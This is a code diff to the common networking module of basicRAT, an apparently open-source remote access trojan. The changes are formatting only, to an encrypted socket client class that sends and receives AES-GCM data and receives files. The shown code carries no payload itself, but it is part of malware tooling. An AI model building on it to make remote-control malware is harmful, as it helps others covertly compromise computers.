@@ -1,5 +1,13 @@
+# -*- coding: utf-8 -*-
+
+#
+# basicRAT common module
+# https://github.com/vesche/basicRAT
+#
+
 import crypto
-from socket import error as SocketError
+import socket
+
 
 class Client(object):
     def __init__(self, conn, addr, IV=0, uid=0):
@@ -16,9 +24,9 @@ class Client(object):
         ciphertext, tag = self.GCM.encrypt(self.IV, plaintext)
         self.IV += 2 # self incrementing should ONLY happen here
         return self.conn.send(
-        crypto.long_to_bytes(self.IV-2, 12) +
-        ciphertext + 
-        crypto.long_to_bytes(tag, 16)
+            crypto.long_to_bytes(self.IV-2, 12) +
+            ciphertext + 
+            crypto.long_to_bytes(tag, 16)
         )
 
     # read data from sock, decrypt using gcm object, and return plaintext
@@ -29,18 +37,20 @@ class Client(object):
         while True:
             try:
                 m += self.conn.recv(4096)
-            except SocketError:
+            except socket.error:
                 break
+
         # prevents decryption of empty string
-        if not m: return m
-    
+        if not m:
+            return m
+
         IV = crypto.bytes_to_long(m[:12])
         ciphertext = m[12:-16]
         tag = crypto.bytes_to_long(m[-16:])
-    
+
         return self.GCM.decrypt(IV, ciphertext, tag)
 
-        # recieve a file from a socket (download)
+    # recieve a file from a socket (download)
     def recvfile(self, fname):
         with open(fname, 'wb') as f:
             data = 1
